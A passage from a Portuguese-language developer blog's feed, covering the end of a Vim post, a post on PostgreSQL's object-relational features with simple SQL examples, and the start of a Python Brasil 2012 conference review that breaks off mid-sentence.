&lt;li&gt;&lt;a href="https://github.com/scrooloose/nerdtree" title="Nerdtree no GitHub"&gt;&lt;em&gt;nerdtree&lt;/em&gt;&lt;/a&gt; – Explore o seu projeto através de uma árvore de
  diretórios&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/scrooloose/syntastic" title="Syntastic no GitHub"&gt;&lt;em&gt;syntastic&lt;/em&gt;&lt;/a&gt; – Verificador de sintaxe que abrange &lt;em&gt;Python&lt;/em&gt;,
  &lt;em&gt;Ruby&lt;/em&gt;, &lt;em&gt;PHP&lt;/em&gt;, &lt;em&gt;Javascript&lt;/em&gt;, etc&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tpope/vim-fugitive" title="Vim-fugitive no GitHub"&gt;&lt;em&gt;vim-fugitive&lt;/em&gt;&lt;/a&gt; – Um &lt;em&gt;wrapper&lt;/em&gt; para utilizar o &lt;em&gt;Git&lt;/em&gt; sem sair do
  &lt;em&gt;Vim&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Lokaltog/vim-powerline" title="Vim-powerline no GitHub"&gt;&lt;em&gt;vim-powerline&lt;/em&gt;&lt;/a&gt; – Adicione uma &lt;em&gt;statusline&lt;/em&gt; mais eficiente ao
  seu &lt;em&gt;Vim&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/vim-scripts/Wombat" title="Wombat no GitHub"&gt;&lt;em&gt;Wombat&lt;/em&gt;&lt;/a&gt; – Um excelente tema para o editor&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Free e open source&lt;/h2&gt;
&lt;p&gt;E por último mas não menos importante: O &lt;em&gt;Vim&lt;/em&gt; é livre, e de código
aberto.&lt;/p&gt;
&lt;p&gt;A sua licença de uso é peculiar, já que é compatível com a
&lt;em&gt;GNU GPL&lt;/em&gt;, mas possui cláusulas que incentivam
doações para &lt;a href="http://www.iccf.nl/news.html" title="Leia os relatórios ICCF"&gt;crianças em Uganda&lt;/a&gt;. Uma causa muito nobre do autor da
ferramenta, &lt;em&gt;Bram Moolenaar&lt;/em&gt;, que além de manter o &lt;em&gt;Vim&lt;/em&gt; e fazer
caridade, participa de outros tantos projetos de código aberto.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Algumas ferramentas acabam cativando os seus usuários de tal modo, que
os pontos negativos acabam sendo (propositalmente) esquecidos. No meu
caso o &lt;em&gt;Vim&lt;/em&gt; é uma dessas ferramentas, e embora eu entenda as críticas
em relação a sua curva de aprendizado, ainda assim o acho mais prático
que muita ferramenta moderna que tem “pipocado” recentemente.&lt;/p&gt;
&lt;p&gt;Se você tem interesse, ou acha um desafio interessante utilizar o &lt;em&gt;Vim&lt;/em&gt;,
eu recomendo que pule de cabeça agora mesmo. Não espere para acabar
aquele manual (ou tutorial) que você vem “negligenciando” há meses. A
maneira mais divertida é ir aprendendo de acordo com a necessidade.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="editores-de-texto"></category><category term="vim"></category></entry><entry><title>Uma ode ao PostgreSQL</title><link href="https://klauslaube.com.br/2013/01/31/uma-ode-ao-postgresql.html" rel="alternate"></link><published>2013-01-31T20:39:21-02:00</published><updated>2013-01-31T20:39:21-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2013-01-31:/2013/01/31/uma-ode-ao-postgresql.html</id><summary type="html">&lt;p&gt;O &lt;a href="http://www.mysql.com/" title="Leia mais sobre o MySQL na página oficial do projeto"&gt;&lt;em&gt;MySQL&lt;/em&gt;&lt;/a&gt; é um dos meus mais leais companheiros de
projetos, desde os meus tempos de &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; até projetos mais recentes
com o &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. A sua agilidade e facilidade são indiscutivelmente
boas, tanto que renderam ao projeto um “domínio global” no ramo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje, sob “cuidados” da &lt;a href="http://www.oracle.com/" title="Página oficial da Oracle"&gt;&lt;em&gt;Oracle&lt;/em&gt;&lt;/a&gt;, o projeto tem …&lt;/p&gt;</summary><content type="html">&lt;p&gt;O &lt;a href="http://www.mysql.com/" title="Leia mais sobre o MySQL na página oficial do projeto"&gt;&lt;em&gt;MySQL&lt;/em&gt;&lt;/a&gt; é um dos meus mais leais companheiros de
projetos, desde os meus tempos de &lt;a href="https://klauslaube.com.br/tag/php.html" title="Leia mais sobre PHP"&gt;&lt;em&gt;PHP&lt;/em&gt;&lt;/a&gt; até projetos mais recentes
com o &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;. A sua agilidade e facilidade são indiscutivelmente
boas, tanto que renderam ao projeto um “domínio global” no ramo.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Hoje, sob “cuidados” da &lt;a href="http://www.oracle.com/" title="Página oficial da Oracle"&gt;&lt;em&gt;Oracle&lt;/em&gt;&lt;/a&gt;, o projeto tem causado &lt;a href="http://www.infoq.com/br/news/2012/08/oracle-mysql-preocupa#.UDfedu0QkJA.twitter" title="MySQL será fechado?"&gt;certas desconfianças&lt;/a&gt;.
A criação de &lt;a href="https://mariadb.org/pt-br/" title="Conheça o MariaDB"&gt;um &lt;em&gt;fork&lt;/em&gt;&lt;/a&gt; pelo autor original não
ajudou, e isso &lt;a href="http://br-linux.org/2013/mais-um-opensuse-confirma-que-vai-abandonar-mysql-e-adotar-mariadb/" title="OpenSUSE deixa o MySQL"&gt;abriu margem&lt;/a&gt; para um velho, confiável e simpático
banco de dados: o &lt;a href="http://www.postgresql.org/" title="Página oficial do projeto"&gt;&lt;em&gt;Postgres&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Qual o motivo de começar um &lt;em&gt;post&lt;/em&gt; sobre o &lt;em&gt;Postgres&lt;/em&gt; falando do
&lt;em&gt;MySQL&lt;/em&gt;? Eu sempre me apoiei na “facilidade de uso” na hora de escolher
entre os dois, e só recentemente me “obriguei” a experimentar o
&lt;em&gt;Postgres&lt;/em&gt; em alguns projetos. O resultado foi a total satisfação com a
experiência, e a (surpreendente) conclusão que ele é tão fácil de mexer
quanto o seu concorrente.&lt;/p&gt;
&lt;h2&gt;O que há de especial no Postgres?&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Postgres&lt;/em&gt; está sob a licença &lt;a href="http://www.postgresql.org/about/licence/" title="Leia mais sobre a licença PostgreSQL"&gt;&lt;em&gt;PostgreSQL License&lt;/em&gt;&lt;/a&gt;, muito similar
a &lt;em&gt;BSD&lt;/em&gt; e &lt;em&gt;MIT&lt;/em&gt;, que nos permite o livre uso, cópia, modificação e
distribuição. Assumidamente o “banco de dados &lt;em&gt;open source&lt;/em&gt; mais
avançado do mundo”, ele é conhecido pela sua estabilidade, servindo
&lt;a href="http://www.postgresql.org/about/users/" title="Conheça alguns projetos relevantes que utilizam o Postgres"&gt;projetos de larga escala em todo o mundo&lt;/a&gt;. Embora eu nunca pude por à
prova a sua confiabilidade e escalabilidade, o fato de ele ser usado
como &lt;a href="https://postgres.heroku.com/postgres" title="Why Postres"&gt;banco relacional pelo &lt;em&gt;Heroku&lt;/em&gt;&lt;/a&gt; apresenta credenciais o
suficiente.&lt;/p&gt;
&lt;p&gt;Entre as &lt;a href="http://www.postgresql.org/about/featurematrix/" title="Feature Matrix"&gt;diversas funcionalidades do &lt;em&gt;Postgres&lt;/em&gt;&lt;/a&gt;, o suporte a
operações assíncronas, o &lt;a href="http://www.postgresql.org/docs/9.2/static/textsearch.html" title="Leia mais sobre na documentação do Postgres"&gt;&lt;em&gt;Full Text Search&lt;/em&gt;&lt;/a&gt; e o &lt;a href="http://postgis.refractions.net/" title="Leia mais sobre PostGIS"&gt;&lt;em&gt;PostGIS&lt;/em&gt;&lt;/a&gt; se
mostraram um bom diferencial para mim. Este último na verdade trata-se
de uma extensão do &lt;em&gt;Postgres&lt;/em&gt; (comprovando outra característica valiosa
do banco, a extensibilidade), e tive a oportunidade de utilizá-lo em um
projeto recente com &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/tag/django.html" title="Leia mais sobre Django"&gt;&lt;em&gt;Django&lt;/em&gt;&lt;/a&gt;. Embora a sua
implantação não tenha sido tão trivial quanto o esperado, o resultado
atendeu completamente as expectativas.&lt;/p&gt;
&lt;p&gt;Outro ponto que acho muito bacana no projeto, é o seu &lt;a href="http://www.postgresql.org/docs/9.2/static/features.html" title="SQL Conformance"&gt;compromisso em seguir o padrão &lt;em&gt;SQL&lt;/em&gt;&lt;/a&gt;.
Atualmente (versão 9.2), o &lt;em&gt;Postgres&lt;/em&gt; se
compromete em atender o padrão &lt;em&gt;ANSI-SQL: 2008&lt;/em&gt;. Acho muito bacana esse
compromisso, principalmente se formos levar em consideração a
&lt;a href="http://en.wikibooks.org/wiki/SQL_dialects_reference" title="SQL dialects"&gt;quantidade de dialetos &lt;em&gt;SQL&lt;/em&gt;&lt;/a&gt; que temos hoje em dia.&lt;/p&gt;
&lt;p&gt;Junte isso tudo a facilidade de uso, e temos uma excelente ferramenta à
nossa disposição. Ainda não está satisfeito? Então vamos falar um pouco
sobre uma das características mais marcantes (e discutidas) do
&lt;em&gt;Postgres&lt;/em&gt;: O modelo objeto-relacional.&lt;/p&gt;
&lt;h2&gt;Objeto-Relacional?&lt;/h2&gt;
&lt;p&gt;A definição de banco de dados objeto-relacional da &lt;a href="http://pt.wikipedia.org/wiki/Banco_de_dados_objeto-relacional" title="Leia mas sobre Objeto-Relacional na Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt; é a
seguinte:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) é um sistema de gerenciamento de banco de dados
(SGBD) semelhante a um banco de dados
relacional, porém com um modelo de banco de dados orientado a objetos:
objetos, classes e herança são suportados diretamente nos esquemas do
banco de dados e na linguagem de consulta. Além disso, ele suporta
extensão do modelo de dados com a personalização de tipos de dados e
métodos.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Basicamente, um banco de dados objeto-relacional armazena os seus dados
de forma “relacional”, mas é capaz de abstrair o seu acesso através de
objetos, possibilitando assim a construção de operações mais complexas
que podem envolver conceitos da orientação a objetos. No &lt;em&gt;Postgres&lt;/em&gt;,
tabelas, relacionamentos, restrições e &lt;em&gt;triggers&lt;/em&gt; são considerados
objetos.&lt;/p&gt;
&lt;p&gt;Mas não são os “objetos” que vemos nas linguagens de programação. O
termo “objeto” aqui é um pouco diferente (e eu diria até limitado),
embora podemos encontrar &lt;a href="http://www.postgresql.org/docs/9.2/static/ddl-inherit.html" title="Leia mais sobre herança de tabelas no Postgres"&gt;heranças&lt;/a&gt;, &lt;a href="http://www.postgresql.org/docs/9.2/static/extend-type-system.html#EXTEND-TYPES-POLYMORPHIC" title="Leia mais sobre tipos polimórficos no Postgres"&gt;polimorfismo&lt;/a&gt; e &lt;a href="http://stackoverflow.com/questions/5625585/sql-postgres-oids-what-are-they-and-why-are-they-useful" title="Saiba mais sobre os OIDs"&gt;object ids&lt;/a&gt;.
No caso do &lt;em&gt;Postgres&lt;/em&gt;, o “objeto” de “objeto-relacional” está
ligado a todos os aspectos citados anteriormente, mais a organização dos
“recursos”, como na utilização de &lt;a href="http://www.postgresql.org/docs/9.2/static/ddl-schemas.html" title="Leia mais sobre Schemas no Postgres"&gt;&lt;em&gt;schemas&lt;/em&gt;&lt;/a&gt;, e na criação de tipos e
manipulação de dados complexos.&lt;/p&gt;
&lt;p&gt;Ou seja, você não verá uma notação como essa em uma &lt;em&gt;query&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;NOW&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="n"&gt;to_char&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;HH12:MI:SS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E sim, a notação utilizando funções:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;to_char&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;NOW&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;HH12:MI:SS&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mas em compensação, você verá que &lt;strong&gt;to_char&lt;/strong&gt; é uma &lt;a href="http://www.postgresql.org/docs/8.3/static/xfunc-sql.html#AEN40446" title="Leia mais sobre funções polimórficas no Postgres"&gt;função polimórfica&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;SELECT&lt;/span&gt; &lt;span class="n"&gt;to_char&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;3333333&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;99.99&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Se você não está satisfeito, e não se sente confortável com o termo
“objeto” usado pelo &lt;em&gt;Postgres&lt;/em&gt;, fique tranquilo… &lt;a href="http://www.postgresql.org/message-id/1335420139.28653.59.camel@jdavis" title="Devemos parar de usar o termo objeto no Postgres?"&gt;mais pessoas carregam esta angústia&lt;/a&gt;.
&lt;em&gt;Michael Stonebraker&lt;/em&gt; criou &lt;a href="http://www.service-architecture.com/object-oriented-databases/articles/stonebrakers_dbms_matrix.html" title="Stonebraker's DBMS Matrix"&gt;um esquema para identificar um &lt;em&gt;ORDBMS&lt;/em&gt;&lt;/a&gt;,
e partindo dele sou obrigado a concordar que
o &lt;em&gt;Postgres&lt;/em&gt; é de fato um banco objeto-relacional quando me deparo com o
seguinte cenário:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;TYPE&lt;/span&gt; &lt;span class="n"&gt;inventory_item&lt;/span&gt; &lt;span class="k"&gt;AS&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt;            &lt;span class="nb"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;supplier_id&lt;/span&gt;     &lt;span class="nb"&gt;integer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="n"&gt;price&lt;/span&gt;             &lt;span class="nb"&gt;numeric&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;CREATE&lt;/span&gt; &lt;span class="k"&gt;TABLE&lt;/span&gt; &lt;span class="n"&gt;on_hand&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="n"&gt;item&lt;/span&gt;      &lt;span class="n"&gt;inventory_item&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="k"&gt;count&lt;/span&gt;     &lt;span class="nb"&gt;integer&lt;/span&gt;
&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="k"&gt;INSERT&lt;/span&gt; &lt;span class="k"&gt;INTO&lt;/span&gt; &lt;span class="n"&gt;on_hand&lt;/span&gt; &lt;span class="k"&gt;VALUES&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ROW&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;fuzzy dice&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="k"&gt;INSERT&lt;/span&gt; &lt;span class="k"&gt;INTO&lt;/span&gt; &lt;span class="n"&gt;on_hand&lt;/span&gt; &lt;span class="k"&gt;VALUES&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;ROW&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;cards&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;42&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="mi"&gt;99&lt;/span&gt;&lt;span class="p"&gt;)::&lt;/span&gt;&lt;span class="n"&gt;inventory_item&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;500&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Uma manipulação complexa, com tipos criados pelo próprio usuário,
utilizando &lt;em&gt;queries&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Postgres&lt;/em&gt; é poderoso! Disso eu não tinha dúvidas. Mas ficar mais
próximo do banco me fez perceber o quanto ele pode agregar ao projeto.
Se em um próximo projeto você estiver em dúvida, e achar que a
utilização dele pode ser complicada, eu recomendo que experimente.&lt;/p&gt;
&lt;p&gt;Até a próxima…&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://ledgersmbdev.blogspot.com.br/2012/08/intro-to-postgresql-as-object.html" title="Leia mais sobre o modelo objeto-relacional do Postgres"&gt;&lt;em&gt;Perspectives on LedgerSMB – O/R Modelling Part 1: Intro to PostgreSQL as Object-Relational Database Management System&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://ledgersmbdev.blogspot.com.br/2012/10/three-approaches-to-object-relational.html" title="Leia o comparativo do approach de Postgres e Oracle em relação ao termo Object-Relational"&gt;&lt;em&gt;Perspectives on LedgerSMB – Three Approaches to Object-Relational Databases: PostgreSQL, Oracle, and Informix&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.postgresql.org/about/" title="Leia tudo sobre o Postgres"&gt;&lt;em&gt;PostgreSQL – About&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.service-architecture.com/object-oriented-databases/articles/stonebrakers_dbms_matrix.html" title="Conheça a linha tênue que separa um ORDBMS de um ODBMS"&gt;&lt;em&gt;Web Services and Service-Oriented Architectures – Stonebraker’s DBMS Matrix&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.wikivs.com/wiki/MySQL_vs_PostgreSQL" title="Veja um comparativo entre MySQL e PostgreSQL"&gt;&lt;em&gt;WikiVS – MySQL vs. PostgreSQL&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="banco-de-dados"></category><category term="ambiente-de-desenvolvimento"></category><category term="postgres"></category><category term="objeto-relacional"></category></entry><entry><title>Opinião: Python Brasil [8]</title><link href="https://klauslaube.com.br/2012/12/09/opiniao-python-brasil-8.html" rel="alternate"></link><published>2012-12-09T14:38:15-02:00</published><updated>2012-12-09T14:38:15-02:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2012-12-09:/2012/12/09/opiniao-python-brasil-8.html</id><summary type="html">&lt;p&gt;Nos dias 21 a 24 de Novembro de 2012 aconteceu
a &lt;a href="http://2012.pythonbrasil.org.br/" title="Visite o site oficial do evento"&gt;&lt;em&gt;Python Brasil&lt;/em&gt;&lt;/a&gt;. Em sua oitava edição, o evento mais aguardado
pelos desenvolvedores &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; “tupiniquins” me surpreendeu
completamente. Um dos melhores eventos que participei nos últimos
tempos!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;E não é só pelo conteúdo apresentado durante as palestras, ou pelos
convidados …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Nos dias 21 a 24 de Novembro de 2012 aconteceu
a &lt;a href="http://2012.pythonbrasil.org.br/" title="Visite o site oficial do evento"&gt;&lt;em&gt;Python Brasil&lt;/em&gt;&lt;/a&gt;. Em sua oitava edição, o evento mais aguardado
pelos desenvolvedores &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt; “tupiniquins” me surpreendeu
completamente. Um dos melhores eventos que participei nos últimos
tempos!&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;E não é só pelo conteúdo apresentado durante as palestras, ou pelos
convidados especiais que deram um show a parte em suas apresentações,
mas esse “sentimento” deve-se ao fato de ser a primeira vez que fiquei
tão próximo da comunidade &lt;em&gt;Python&lt;/em&gt;, e me senti muito feliz por
compartilhar estes dias com pessoas tão bacanas e interessantes.&lt;/p&gt;
&lt;h2&gt;Expectativas&lt;/h2&gt;
&lt;p&gt;Nunca tive dúvidas em relação a qualidade do evento, pelo contrário,
várias pessoas que conheço já haviam participado e deram um bom
&lt;em&gt;feedback&lt;/em&gt;. A &lt;a href="http://www.globo.com/" title="Visite o portal da Globo.com"&gt;&lt;em&gt;Globo.com&lt;/em&gt;&lt;/a&gt; é “figurinha carimbada” no evento,
portanto vários colegas de trabalho já haviam participado, seja como
expectador ou como palestrante.&lt;/p&gt;
&lt;p&gt;Mas a minha expectativa maior estava em relação às pessoas. Estar entre
o pessoal era algo muito difícil para mim (geograficamente falando),
então conhecer alguns profissionais que acompanho pelo &lt;a href="http://www.twitter.com/kplaube/" title="Siga-me no Twitter"&gt;&lt;em&gt;Twitter&lt;/em&gt;&lt;/a&gt; era
uma das metas que eu tinha para o evento.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/estande-globocom.jpg" width="600" height="448" title="Estande da Globo.com na Python brasil 8" alt="Estande da Globo.com na Python brasil 8"&gt;&lt;/p&gt;
&lt;h2&gt;Resultados&lt;/h2&gt;
&lt;p&gt;Não consegui assistir aos tutoriais, logo, meu &lt;em&gt;feedback&lt;/em&gt; será
totalmente focado nas palestras.&lt;/p&gt;
&lt;p&gt;Acredito que a melhor maneira de resumir o resultado é: &lt;strong&gt;Não vejo a
hora de participar da &lt;em&gt;Python&lt;/em&gt; Brasil 9&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;O evento contou com alguns probleminhas de atrasos, e em alguns momentos
de conectividade, mas fora isso foi excelente! O &lt;a href="http://2012.pythonbrasil.org.br/venue/" title="Centro de Convenções Sul América, no Rio de Janeiro"&gt;local&lt;/a&gt;, bem
posicionado no centro do Rio de Janeiro, possuía um grande espaço. As
salas para as apresentações eram de fácil acesso. A &lt;a href="http://2012.pythonbrasil.org.br/schedule/" title="Conheça o conteúdo apresentado na Python Brasil 2012"&gt;programação&lt;/a&gt;
estava excelente, contando com palestras que iam de provisionamento com
&lt;em&gt;Puppet&lt;/em&gt; até programação com o &lt;em&gt;Raspberry Pi&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Fiquei muito feliz por ter participado do evento, e transmito os meus
parabéns a todos os envolvidos. Um trabalho duro, de fato, mas muito bem
executado.&lt;/p&gt;
&lt;p&gt;Em tempo… o café do pessoal do &lt;a href="http://www.facebook.com/curtocafe" title="Visite a página no Facebook"&gt;&lt;em&gt;Curto Café&lt;/em&gt;&lt;/a&gt; estava sensacional! Vale
a recomendação… café feito com muita paixão.&lt;/p&gt;
&lt;h2&gt;As palestras&lt;/h2&gt;
&lt;p&gt;Não pretendo descrever como foi cada palestra, apenas levantar alguns
pontos marcantes. Por exemplo, &lt;a href="http://www.web2py.com/examples/default/who" title="Conheça os contribuidores da Web2Py"&gt;&lt;em&gt;Massimo Di Pierro&lt;/em&gt;&lt;/a&gt;, &lt;em&gt;lead developer&lt;/em&gt;
da &lt;em&gt;Web2Py&lt;/em&gt;, fez a seguinte declaração:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Todo mundo deveria programar, pois gera valor, e pode ser descartado sem avarias ao meio ambiente.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A palestra do &lt;em&gt;Massimo&lt;/em&gt; foi muito boa, focada nas facilidades de uso do
&lt;em&gt;Web2Py&lt;/em&gt;. Algumas declarações como “convention over configuration” foram
um tanto controversas, mas ele conseguiu passar o seu ponto.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Sergio Oliveira&lt;/em&gt; e &lt;em&gt;Davi Oliveira&lt;/em&gt; falaram sobre &lt;em&gt;Puppet&lt;/em&gt;, e
demonstraram ao vivo o seu uso. O &lt;a href="http://github/tracywebtech" title="Perfil da TracyWebTech no GitHub"&gt;&lt;em&gt;GitHub&lt;/em&gt; da &lt;em&gt;TracyWebTech&lt;/em&gt;&lt;/a&gt; possui
uma série de &lt;em&gt;scripts&lt;/em&gt; para provisionamento prontos, que valem a pena
dar uma olhada. Ainda em provisionamento, &lt;em&gt;Diogo Baeder&lt;/em&gt; e &lt;em&gt;Bernardo
Heynemann&lt;/em&gt; falaram sobre o &lt;a href="http://heynemann.github.com/provy/" title="Provisionamento para desenvolvedores"&gt;&lt;em&gt;Provy&lt;/em&gt;&lt;/a&gt;, uma forma de provisionar
servidores “feita para desenvolvedores” (e em &lt;em&gt;Python&lt;/em&gt; (: ).&lt;/p&gt;
&lt;p&gt;Uma das melhores palestras do evento foi a do &lt;em&gt;Tarek Ziade&lt;/em&gt; sobre o
&lt;a href="http://circus.readthedocs.org/en/0.5.2.1/" title="A Process &amp;amp; Socket Manager"&gt;&lt;em&gt;Circus&lt;/em&gt;&lt;/a&gt;. A apresentação pode ser &lt;a href="http://blog.ziade.org/slides/pyconbrazil2012/circus.html" title="Veja a apresentação do Tarek na Python Brasil"&gt;conferida aqui&lt;/a&gt;. É bom conhecer
uma alternativa mais rica ao &lt;a href="https://klauslaube.com.br/2012/01/23/supervisor-gerencie-os-processos-seu-servidor-web.html" title="Aumentando a disponibilidade das suas aplicações Web"&gt;&lt;em&gt;Supervisor&lt;/em&gt;&lt;/a&gt;, com monitoramento em
tempo real e um &lt;em&gt;console Web&lt;/em&gt; para gerenciamento.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/palestra-tarek-circus-python-brasil-8.jpg" width="600" height="448" title="Tarek Ziade, da Mozilla, falando sobre Circus" alt="Tarek Ziade, da Mozilla, falando sobre Circus"&gt;&lt;/p&gt;
&lt;p&gt;O &lt;em&gt;Tarek&lt;/em&gt; falou também sobre empacotamento em &lt;em&gt;Python&lt;/em&gt;. Eu acho a
experiência do &lt;em&gt;pip&lt;/em&gt; e &lt;em&gt;PyPI&lt;/em&gt; excelente, e acho que o empacotamento é
um ponto fortíssimo da linguagem. Mas, &lt;a href="http://blog.ziade.org/slides/pyconbrazil2012/packaging.html" title="Confira a palestra do Tarek sobre empacotamento com Python"&gt;segundo a sua apresentação&lt;/a&gt;, o
palestrante conseguiu levantar alguns pontos negativos, e salientou o
árduo caminho que o &lt;em&gt;Python&lt;/em&gt; trilhou para chegar até o momento atual.
Vale a pena conferir!&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Bob Hancock&lt;/em&gt; marcou presença com a sua palestra sobre paralelismo e
concorrência, disparando uma série de frases que “reverberaram” pelo
&lt;em&gt;Twitter&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PyPy is not the salvation!&lt;/li&gt;
&lt;li&gt;Be an Engineer and not a Developer.&lt;/li&gt;
&lt;li&gt;Don’t write another Web Framework.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Outras tantas palestras foram sensacionais, como a do &lt;em&gt;Bruno Rocha&lt;/em&gt;
sobre &lt;em&gt;Whoosh&lt;/em&gt;, ou do &lt;em&gt;Andrews Medina&lt;/em&gt; sobre &lt;em&gt;refactoring&lt;/em&gt;. Pretendo
escrever &lt;em&gt;posts&lt;/em&gt; específicos com o conteúdo destas, portanto, não vou
